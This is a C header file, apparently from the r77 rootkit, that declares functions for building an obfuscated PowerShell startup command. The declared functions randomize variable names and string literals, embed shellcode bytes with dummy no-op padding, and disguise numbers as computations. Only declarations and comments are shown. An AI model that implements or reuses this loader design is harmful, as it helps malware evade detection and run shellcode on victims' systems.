#define CUSTOM_ENTRY
#include "r77mindef.h"

/// <summary>
/// Creates the powershell startup command.
/// </summary>
/// <returns>
/// A newly allocated LPCSTR with the powershell command.
/// </returns>
LPWSTR GetPowershellCommand();
/// <summary>
/// Obfuscates all occurrences of a given variable name within a powershell command.
/// </summary>
/// <param name="command">The powershell command to obfuscate.</param>
/// <param name="variableName">A name that will be replaced with a new, randomized name.</param>
VOID ObfuscatePowershellVariable(LPWSTR command, LPCWSTR variableName);
/// <summary>
/// Obfuscates all string literals within a powershell command.
/// String literals must be typed like `thestring` instead of using single quotes.
/// </summary>
/// <param name="command">The powershell command to obfuscate.</param>
VOID ObfuscatePowershellStringLiterals(LPWSTR command);
/// <summary>
/// Appends comma separated shellcode bytes to the command.
/// </summary>
/// <param name="command">The powershell command to append the shellcode to.</param>
/// <param name="shellCode">The shellcode bytes to append.</param>
/// <param name="size">The number of bytes to append.</param>
VOID WriteShellCodeBytes(LPWSTR command, LPCBYTE shellCode, DWORD size);
/// <summary>
/// Appends comma separated shellcode bytes to the command that represend a no-op, such as "mov eax, eax".
/// </summary>
/// <param name="command">The powershell command to append the dummy shellcode to.</param>
/// <returns>
/// The number of bytes written.
/// </returns>
DWORD WriteDummyShellCodeBytes(LPWSTR command);
/// <summary>
/// Appends an obfuscated integer to the powershell command, represented by a computation of two numbers.
/// </summary>
/// <param name="command">The powershell command to append the number to.</param>
/// <param name="number">The number to obfuscated and add.</param>
VOID WriteObfuscatedNumber(LPWSTR command, DWORD number);